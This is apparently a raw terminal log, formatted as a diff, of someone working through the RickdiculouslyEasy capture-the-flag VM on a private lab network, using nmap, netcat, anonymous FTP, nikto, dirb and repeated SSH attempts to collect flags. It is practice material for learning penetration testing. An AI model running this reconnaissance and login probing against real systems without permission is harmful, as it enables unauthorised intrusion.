@@ -1,0 +1,2451 @@
+]
+└─$ nmap 192.168.56.103 -Pn -p- -sV
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-27 00:53 EDT
+Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 59.84% done; ETC: 00:53 (0:00:05 remaining)
+Stats: 0:00:22 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 66.63% done; ETC: 00:53 (0:00:05 remaining)
+Stats: 0:00:23 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 69.30% done; ETC: 00:53 (0:00:04 remaining)
+Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 80.90% done; ETC: 00:53 (0:00:03 remaining)
+Stats: 0:00:25 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 84.48% done; ETC: 00:53 (0:00:02 remaining)
+Stats: 0:00:33 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 57.14% done; ETC: 00:53 (0:00:05 remaining)
+Stats: 0:00:39 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.68% done; ETC: 00:53 (0:00:00 remaining)
+Stats: 0:00:49 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.68% done; ETC: 00:53 (0:00:00 remaining)
+Stats: 0:00:51 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.68% done; ETC: 00:53 (0:00:00 remaining)
+Stats: 0:00:57 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.68% done; ETC: 00:54 (0:00:00 remaining)
+Stats: 0:00:59 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.68% done; ETC: 00:54 (0:00:00 remaining)
+Stats: 0:01:02 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.68% done; ETC: 00:54 (0:00:00 remaining)
+Stats: 0:01:06 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.68% done; ETC: 00:54 (0:00:00 remaining)
+Nmap scan report for 192.168.56.103
+Host is up (0.00082s latency).
+Not shown: 65528 closed tcp ports (conn-refused)
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.3
+22/tcp    open  ssh?
+80/tcp    open  http    Apache httpd 2.4.27 ((Fedora))
+9090/tcp  open  http    Cockpit web service 161 or earlier
+13337/tcp open  unknown
+22222/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
+60000/tcp open  unknown
+3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port22-TCP:V=7.94%I=7%D=10/27%Time=653B424D%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,42,"Welcome\x20to\x20Ubuntu\x2014\.04\.5\x20LTS\x20\(GNU/Linux\x204\.
+SF:4\.0-31-generic\x20x86_64\)\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port13337-TCP:V=7.94%I=7%D=10/27%Time=653B424D%P=x86_64-pc-linux-gnu%r(
+SF:NULL,29,"FLAG:{TheyFoundMyBackDoorMorty}-10Points\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port60000-TCP:V=7.94%I=7%D=10/27%Time=653B4253%P=x86_64-pc-linux-gnu%r(
+SF:NULL,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20reverse\x20shell\.\
+SF:.\.\n#\x20")%r(ibm-db2,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20r
+SF:everse\x20shell\.\.\.\n#\x20");
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 70.16 seconds
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ nc 192.168.56.103 13337        
+FLAG:{TheyFoundMyBackDoorMorty}-10Points
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ nc 192.168.56.103 60000
+Welcome to Ricks half baked reverse shell...
+# ls
+FLAG.txt 
+# cat FLAG.txt  
+FLAG{Flip the pickle Morty!} - 10 Points 
+# ^C
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ ftp://192.168.56.103       
+zsh: no such file or directory: ftp://192.168.56.103
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ nc 192.168.56.103 60000
+Welcome to Ricks half baked reverse shell...
+# ftp://192.168.56.103
+ftp://192.168.56.103: command not found 
+# ^C
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ ftp://192.168.56.103   
+zsh: no such file or directory: ftp://192.168.56.103
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ ftp                 
+ftp> 192.168.56.103
+?Invalid command.
+ftp> open 192.168.56.103
+Connected to 192.168.56.103.
+220 (vsFTPd 3.0.3)
+Name (192.168.56.103:kali): kali
+331 Please specify the password.
+Password: 
+530 Login incorrect.
+ftp: Login failed
+ftp> open 192.168.56.103
+Already connected to 192.168.56.103, use close first.
+ftp> 
+ftp> open 192.168.56.103
+Already connected to 192.168.56.103, use close first.
+ftp> close
+221 Goodbye.
+ftp> open 192.168.56.103
+Connected to 192.168.56.103.
+220 (vsFTPd 3.0.3)
+Name (192.168.56.103:kali): Anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||38470|)
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
+drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
+226 Directory send OK.
+ftp> cat FLAG.txt
+?Invalid command.
+ftp> get FLAG.txt
+local: FLAG.txt remote: FLAG.txt
+229 Entering Extended Passive Mode (|||63116|)
+150 Opening BINARY mode data connection for FLAG.txt (42 bytes).
+100% |***********************************************************************************************************************************************************************************************|    42        3.10 KiB/s    00:00 ETA
+226 Transfer complete.
+42 bytes received in 00:00 (2.79 KiB/s)
+ftp> exit
+221 Goodbye.
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ ls
+bandit_overthewire  Desktop  Documents  Downloads  FLAG.txt  IoT_Goat  latihan_folder  Music  picoctf  Pictures  Public  Templates  test_linksys-01.cap  Videos
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ cat FLAG.txt                                   
+FLAG{Whoa this is unexpected} - 10 Points
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ mv FLAG.txt ~/Documents/RickdiculouslyEasy 
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ cd Documents/RickdiculouslyEasy 
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ ls
+FLAG.txt  hints.txt
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ nikto -host 192.168.56.103
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.56.103
++ Target Hostname:    192.168.56.103
++ Target Port:        80
++ Start Time:         2023-10-27 01:23:47 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.27 (Fedora)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ Apache/2.4.27 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ OPTIONS: Allowed HTTP Methods: HEAD, GET, POST, OPTIONS, TRACE .
++ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
++ /passwords/: Directory indexing found.
++ /passwords/: This might be interesting.
++ /icons/: Directory indexing found.
++ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
++ 8908 requests: 0 error(s) and 9 item(s) reported on remote host
++ End Time:           2023-10-27 01:24:23 (GMT-4) (36 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ sudo dirb https://192.168.56.103 /opt/dirb/wordlists/big.txt
+[sudo] password for kali: 
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Oct 27 01:51:04 2023
+URL_BASE: https://192.168.56.103/
+WORDLIST_FILES: /opt/dirb/wordlists/big.txt
+
+-----------------
+
+*** Generating Wordlist...
+(!) FATAL: Error opening wordlist file: /opt/dirb/wordlists/big.txt
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ sudo dirb https://192.168.56.103 /opt/dirb/wordlists/big.txt
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Oct 27 01:51:35 2023
+URL_BASE: https://192.168.56.103/
+WORDLIST_FILES: /opt/dirb/wordlists/big.txt
+
+-----------------
+
+*** Generating Wordlist...
+(!) FATAL: Error opening wordlist file: /opt/dirb/wordlists/big.txt
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ sudo dirb https://192.168.56.103 /opt/dirb/wordlists/big.txt
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Oct 27 01:52:36 2023
+URL_BASE: https://192.168.56.103/
+WORDLIST_FILES: /opt/dirb/wordlists/big.txt
+
+-----------------
+
+*** Generating Wordlist...
+(!) FATAL: Error opening wordlist file: /opt/dirb/wordlists/big.txt
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ sudo dirb https://192.168.56.103 /opt/dirb/wordlists/common.txt
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Oct 27 01:56:19 2023
+URL_BASE: https://192.168.56.103/
+WORDLIST_FILES: /opt/dirb/wordlists/common.txt
+
+-----------------
+
+*** Generating Wordlist...
+(!) FATAL: Error opening wordlist file: /opt/dirb/wordlists/common.txt
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ sudo dirb https://192.168.56.103 /usr/share/wordlists/rockyou.txt 
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Oct 27 01:56:48 2023
+URL_BASE: https://192.168.56.103/
+WORDLIST_FILES: /usr/share/wordlists/rockyou.txt
+
+-----------------
+
+zsh: killed     sudo dirb https://192.168.56.103 /usr/share/wordlists/rockyou.txt
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ 
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ 
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ sudo dirb https://192.168.56.103 /usr/share/wordlists/big.txt    
+[sudo] password for kali: 
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Oct 27 02:15:14 2023
+URL_BASE: https://192.168.56.103/
+WORDLIST_FILES: /usr/share/wordlists/big.txt
+
+-----------------
+
+*** Generating Wordlist...
+(!) FATAL: Error opening wordlist file: /usr/share/wordlists/big.txt
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ sudo dirb https://192.168.56.103 /opt/dirb/wordlists/big.txt     
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Oct 27 02:15:36 2023
+URL_BASE: https://192.168.56.103/
+WORDLIST_FILES: /opt/dirb/wordlists/big.txt
+
+-----------------
+
+*** Generating Wordlist...
+(!) FATAL: Error opening wordlist file: /opt/dirb/wordlists/big.txt
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ sudo dirb https://192.168.56.103 /opt/dirb/wordlists/big.txt
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Oct 27 02:15:49 2023
+URL_BASE: https://192.168.56.103/
+WORDLIST_FILES: /opt/dirb/wordlists/big.txt
+
+-----------------
+
+*** Generating Wordlist...
+(!) FATAL: Error opening wordlist file: /opt/dirb/wordlists/big.txt
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ sudo dirb http://192.168.56.103 /opt/dirb/wordlists/big.txt 
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Oct 27 02:16:44 2023
+URL_BASE: http://192.168.56.103/
+WORDLIST_FILES: /opt/dirb/wordlists/big.txt
+
+-----------------
+
+*** Generating Wordlist...
+(!) FATAL: Error opening wordlist file: /opt/dirb/wordlists/big.txt
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ grep '[a-zA-Z0-9]' /etc/passwd  
+root:x:0:0:root:/root:/usr/bin/zsh
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
+tss:x:101:109:TPM software stack,,,:/var/lib/tpm:/bin/false
+strongswan:x:102:65534::/var/lib/strongswan:/usr/sbin/nologin
+tcpdump:x:103:110::/nonexistent:/usr/sbin/nologin
+usbmux:x:104:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+avahi:x:107:112:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
+speech-dispatcher:x:108:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+pulse:x:109:114:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
+lightdm:x:110:116:Light Display Manager:/var/lib/lightdm:/bin/false
+saned:x:111:118::/var/lib/saned:/usr/sbin/nologin
+polkitd:x:996:996:polkit:/nonexistent:/usr/sbin/nologin
+rtkit:x:112:119:RealtimeKit,,,:/proc:/usr/sbin/nologin
+colord:x:113:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+nm-openvpn:x:114:121:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
+nm-openconnect:x:115:122:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/usr/sbin/nologin
+mysql:x:116:124:MySQL Server,,,:/nonexistent:/bin/false
+stunnel4:x:995:995:stunnel service system account:/var/run/stunnel4:/usr/sbin/nologin
+_rpc:x:117:65534::/run/rpcbind:/usr/sbin/nologin
+geoclue:x:118:126::/var/lib/geoclue:/usr/sbin/nologin
+Debian-snmp:x:119:127::/var/lib/snmp:/bin/false
+sslh:x:120:128::/nonexistent:/usr/sbin/nologin
+ntpsec:x:121:131::/nonexistent:/usr/sbin/nologin
+redsocks:x:122:132::/var/run/redsocks:/usr/sbin/nologin
+rwhod:x:123:65534::/var/spool/rwho:/usr/sbin/nologin
+_gophish:x:124:134::/var/lib/gophish:/usr/sbin/nologin
+iodine:x:125:65534::/run/iodine:/usr/sbin/nologin
+miredo:x:126:65534::/var/run/miredo:/usr/sbin/nologin
+statd:x:127:65534::/var/lib/nfs:/usr/sbin/nologin
+redis:x:128:135::/var/lib/redis:/usr/sbin/nologin
+postgres:x:129:136:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+mosquitto:x:130:138::/var/lib/mosquitto:/usr/sbin/nologin
+inetsim:x:131:139::/var/lib/inetsim:/usr/sbin/nologin
+_gvm:x:132:141::/var/lib/openvas:/usr/sbin/nologin
+kali:x:1000:1000:,,,:/home/kali:/usr/bin/zsh
+chooson:x:1001:1001::/home/chooson:/bin/bash
+chooson01:x:1002:1002:LiemCuSun,,,:/home/chooson01:/bin/bash
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ sudo dirb http://192.168.56.103 /opt/dirb/wordlists/big.txt
+[sudo] password for kali: 
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Oct 27 02:52:19 2023
+URL_BASE: http://192.168.56.103/
+WORDLIST_FILES: /opt/dirb/wordlists/big.txt
+
+-----------------
+
+*** Generating Wordlist...
+(!) FATAL: Error opening wordlist file: /opt/dirb/wordlists/big.txt
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ sudo dirb http://192.168.56.103 /usr/share/wordlists/dirb/common.txt 
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Oct 27 02:53:47 2023
+URL_BASE: http://192.168.56.103/
+WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.56.103/ ----
++ http://192.168.56.103/cgi-bin/ (CODE:403|SIZE:217)                                                                                                                                                                                       
++ http://192.168.56.103/index.html (CODE:200|SIZE:326)                                                                                                                                                                                     
+==> DIRECTORY: http://192.168.56.103/passwords/                                                                                                                                                                                            
++ http://192.168.56.103/robots.txt (CODE:200|SIZE:126)                                                                                                                                                                                     
+                                                                                                                                                                                                                                           
+---- Entering directory: http://192.168.56.103/passwords/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+-----------------
+END_TIME: Fri Oct 27 02:53:53 2023
+DOWNLOADED: 4612 - FOUND: 3
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ ssh RickSanchez@192.168.56.103                                      
+kex_exchange_identification: Connection closed by remote host
+Connection closed by 192.168.56.103 port 22
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ ssh RickSanchez@192.168.56.103 -p 22
+kex_exchange_identification: Connection closed by remote host
+Connection closed by 192.168.56.103 port 22
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ ssh RickSanchez@192.168.56.103 -p 22 -v
+OpenSSH_9.3p2 Debian-1, OpenSSL 3.0.10 1 Aug 2023
+debug1: Reading configuration data /etc/ssh/ssh_config
+debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
+debug1: /etc/ssh/ssh_config line 21: Applying options for *
+debug1: Connecting to 192.168.56.103 [192.168.56.103] port 22.
+debug1: Connection established.
+debug1: identity file /home/kali/.ssh/id_rsa type -1
+debug1: identity file /home/kali/.ssh/id_rsa-cert type -1
+debug1: identity file /home/kali/.ssh/id_ecdsa type -1
+debug1: identity file /home/kali/.ssh/id_ecdsa-cert type -1
+debug1: identity file /home/kali/.ssh/id_ecdsa_sk type -1
+debug1: identity file /home/kali/.ssh/id_ecdsa_sk-cert type -1
+debug1: identity file /home/kali/.ssh/id_ed25519 type -1
+debug1: identity file /home/kali/.ssh/id_ed25519-cert type -1
+debug1: identity file /home/kali/.ssh/id_ed25519_sk type -1
+debug1: identity file /home/kali/.ssh/id_ed25519_sk-cert type -1
+debug1: identity file /home/kali/.ssh/id_xmss type -1
+debug1: identity file /home/kali/.ssh/id_xmss-cert type -1
+debug1: identity file /home/kali/.ssh/id_dsa type -1
+debug1: identity file /home/kali/.ssh/id_dsa-cert type -1
+debug1: Local version string SSH-2.0-OpenSSH_9.3p2 Debian-1
+debug1: kex_exchange_identification: banner line 0: Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)
+kex_exchange_identification: Connection closed by remote host
+Connection closed by 192.168.56.103 port 22
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ ssh Morty@192.168.56.103 -p 22 -v
+OpenSSH_9.3p2 Debian-1, OpenSSL 3.0.10 1 Aug 2023
+debug1: Reading configuration data /etc/ssh/ssh_config
+debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
+debug1: /etc/ssh/ssh_config line 21: Applying options for *
+debug1: Connecting to 192.168.56.103 [192.168.56.103] port 22.
+debug1: Connection established.
+debug1: identity file /home/kali/.ssh/id_rsa type -1
+debug1: identity file /home/kali/.ssh/id_rsa-cert type -1
+debug1: identity file /home/kali/.ssh/id_ecdsa type -1
+debug1: identity file /home/kali/.ssh/id_ecdsa-cert type -1
+debug1: identity file /home/kali/.ssh/id_ecdsa_sk type -1
+debug1: identity file /home/kali/.ssh/id_ecdsa_sk-cert type -1
+debug1: identity file /home/kali/.ssh/id_ed25519 type -1
+debug1: identity file /home/kali/.ssh/id_ed25519-cert type -1
+debug1: identity file /home/kali/.ssh/id_ed25519_sk type -1
+debug1: identity file /home/kali/.ssh/id_ed25519_sk-cert type -1
+debug1: identity file /home/kali/.ssh/id_xmss type -1
+debug1: identity file /home/kali/.ssh/id_xmss-cert type -1
+debug1: identity file /home/kali/.ssh/id_dsa type -1
+debug1: identity file /home/kali/.ssh/id_dsa-cert type -1
+debug1: Local version string SSH-2.0-OpenSSH_9.3p2 Debian-1
+debug1: kex_exchange_identification: banner line 0: Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)
+kex_exchange_identification: Connection closed by remote host
+Connection closed by 192.168.56.103 port 22
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ ssh Summer@192.168.56.103 -p 22 -v
+OpenSSH_9.3p2 Debian-1, OpenSSL 3.0.10 1 Aug 2023
+debug1: Reading configuration data /etc/ssh/ssh_config
+debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
+debug1: /etc/ssh/ssh_config line 21: Applying options for *
+debug1: Connecting to 192.168.56.103 [192.168.56.103] port 22.
+debug1: Connection established.
+debug1: identity file /home/kali/.ssh/id_rsa type -1
+debug1: identity file /home/kali/.ssh/id_rsa-cert type -1
+debug1: identity file /home/kali/.ssh/id_ecdsa type -1
+debug1: identity file /home/kali/.ssh/id_ecdsa-cert type -1
+debug1: identity file /home/kali/.ssh/id_ecdsa_sk type -1
+debug1: identity file /home/kali/.ssh/id_ecdsa_sk-cert type -1
+debug1: identity file /home/kali/.ssh/id_ed25519 type -1
+debug1: identity file /home/kali/.ssh/id_ed25519-cert type -1
+debug1: identity file /home/kali/.ssh/id_ed25519_sk type -1
+debug1: identity file /home/kali/.ssh/id_ed25519_sk-cert type -1
+debug1: identity file /home/kali/.ssh/id_xmss type -1
+debug1: identity file /home/kali/.ssh/id_xmss-cert type -1
+debug1: identity file /home/kali/.ssh/id_dsa type -1
+debug1: identity file /home/kali/.ssh/id_dsa-cert type -1
+debug1: Local version string SSH-2.0-OpenSSH_9.3p2 Debian-1
+debug1: kex_exchange_identification: banner line 0: Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)
+kex_exchange_identification: Connection closed by remote host
+Connection closed by 192.168.56.103 port 22
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ ssh Summer@192.168.56.103 -v      
+OpenSSH_9.3p2 Debian-1, OpenSSL 3.0.10 1 Aug 2023
+debug1: Reading configuration data /etc/ssh/ssh_config
+debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
+debug1: /etc/ssh/ssh_config line 21: Applying options for *
+debug1: Connecting to 192.168.56.103 [192.168.56.103] port 22.
+debug1: Connection established.
+debug1: identity file /home/kali/.ssh/id_rsa type -1
+debug1: identity file /home/kali/.ssh/id_rsa-cert type -1
+debug1: identity file /home/kali/.ssh/id_ecdsa type -1
+debug1: identity file /home/kali/.ssh/id_ecdsa-cert type -1
+debug1: identity file /home/kali/.ssh/id_ecdsa_sk type -1
+debug1: identity file /home/kali/.ssh/id_ecdsa_sk-cert type -1
+debug1: identity file /home/kali/.ssh/id_ed25519 type -1
+debug1: identity file /home/kali/.ssh/id_ed25519-cert type -1
+debug1: identity file /home/kali/.ssh/id_ed25519_sk type -1
+debug1: identity file /home/kali/.ssh/id_ed25519_sk-cert type -1
+debug1: identity file /home/kali/.ssh/id_xmss type -1
+debug1: identity file /home/kali/.ssh/id_xmss-cert type -1
+debug1: identity file /home/kali/.ssh/id_dsa type -1
+debug1: identity file /home/kali/.ssh/id_dsa-cert type -1
+debug1: Local version string SSH-2.0-OpenSSH_9.3p2 Debian-1
+debug1: kex_exchange_identification: banner line 0: Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)
+kex_exchange_identification: Connection closed by remote host
+Connection closed by 192.168.56.103 port 22
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ ssh Summer@192.168.56.103   
+kex_exchange_identification: Connection closed by remote host
+Connection closed by 192.168.56.103 port 22
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ ssh Summer@192.168.56.103 -p 22 -v
+OpenSSH_9.3p2 Debian-1, OpenSSL 3.0.10 1 Aug 2023
+debug1: Reading configuration data /etc/ssh/ssh_config
+debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
+debug1: /etc/ssh/ssh_config line 21: Applying options for *
+debug1: Connecting to 192.168.56.103 [192.168.56.103] port 22.
+debug1: Connection established.
+debug1: identity file /home/kali/.ssh/id_rsa type -1
+debug1: identity file /home/kali/.ssh/id_rsa-cert type -1
+debug1: identity file /home/kali/.ssh/id_ecdsa type -1
+debug1: identity file /home/kali/.ssh/id_ecdsa-cert type -1
+debug1: identity file /home/kali/.ssh/id_ecdsa_sk type -1
+debug1: identity file /home/kali/.ssh/id_ecdsa_sk-cert type -1
+debug1: identity file /home/kali/.ssh/id_ed25519 type -1
+debug1: identity file /home/kali/.ssh/id_ed25519-cert type -1
+debug1: identity file /home/kali/.ssh/id_ed25519_sk type -1
+debug1: identity file /home/kali/.ssh/id_ed25519_sk-cert type -1
+debug1: identity file /home/kali/.ssh/id_xmss type -1
+debug1: identity file /home/kali/.ssh/id_xmss-cert type -1
+debug1: identity file /home/kali/.ssh/id_dsa type -1
+debug1: identity file /home/kali/.ssh/id_dsa-cert type -1
+debug1: Local version string SSH-2.0-OpenSSH_9.3p2 Debian-1
+debug1: kex_exchange_identification: banner line 0: Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)
+kex_exchange_identification: Connection closed by remote host
+Connection closed by 192.168.56.103 port 22
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ ssh Summer@192.168.56.103 -p 2222 -v
+OpenSSH_9.3p2 Debian-1, OpenSSL 3.0.10 1 Aug 2023
+debug1: Reading configuration data /etc/ssh/ssh_config
+debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
+debug1: /etc/ssh/ssh_config line 21: Applying options for *
+debug1: Connecting to 192.168.56.103 [192.168.56.103] port 2222.
+debug1: connect to address 192.168.56.103 port 2222: Connection refused
+ssh: connect to host 192.168.56.103 port 2222: Connection refused
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ ssh Summer@192.168.56.103 -p 9000 -v
+OpenSSH_9.3p2 Debian-1, OpenSSL 3.0.10 1 Aug 2023
+debug1: Reading configuration data /etc/ssh/ssh_config
